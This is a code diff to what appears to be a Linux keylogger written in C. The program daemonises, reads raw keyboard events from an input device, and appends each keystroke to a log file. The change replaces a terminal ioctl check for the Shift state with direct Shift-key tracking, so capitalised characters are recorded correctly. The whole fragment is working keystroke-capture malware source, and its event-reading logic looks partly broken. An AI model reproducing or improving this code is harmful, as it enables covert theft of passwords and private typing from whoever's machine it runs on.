@@ -212,6 +212,7 @@ unsigned n;
 char keys_return[32];
 Display *xdisplay = XOpenDisplay((char*)0);
 
+// Daemon process
 pid_t id_process = 0;
 pid_t sid = 0;
 
@@ -238,13 +239,30 @@ if(fd_pid != -1){
     }
   close(fd_pid);
 }
+// --- End ---
+
+FILE *kbd = fopen(dev_input, "r");
 
 if (xdisplay == NULL) {
+
 int flag_caps = 0;
+int shift_pressed;
 
 while (1) {
+
+  fread(&events, sizeof(events), 1, kbd);
+  if (events.type == EV_KEY && (events.code == KEY_LEFTSHIFT || events.code == KEY_RIGHTSHIFT))
+  {
+   switch (events.value)
+    {
+      case 0: shift_pressed=0; break;
+      case 1: shift_pressed=1; break;
+    }
+  }
+
   read(input_keyboard, &events, sizeof(struct input_event));
   fflush(stdout);
+
     if( (events.type == EV_KEY) && (events.value == 0) ) {
       key = fopen(outfile, "a");
 
@@ -265,17 +283,11 @@ while (1) {
           fclose(key);
 
     } else if (flag_caps == 0) {
-      char shift_state = 6;
 
-      if (ioctl(0, TIOCLINUX, &shift_state) < 0) {
-        perror("ioctl TIOCLINUX 6 (get shift state)");
-        exit(1);
-      }
-
-      if (shift_state == 0) {
+      if (shift_pressed == 0) {
        fprintf(key, KeycodesNormal[events.code]);
        fclose(key);
-      } else if (shift_state == 1) {
+      } else if (shift_pressed == 1) {
        fprintf(key, Shift[events.code]);
        fclose(key);
       }
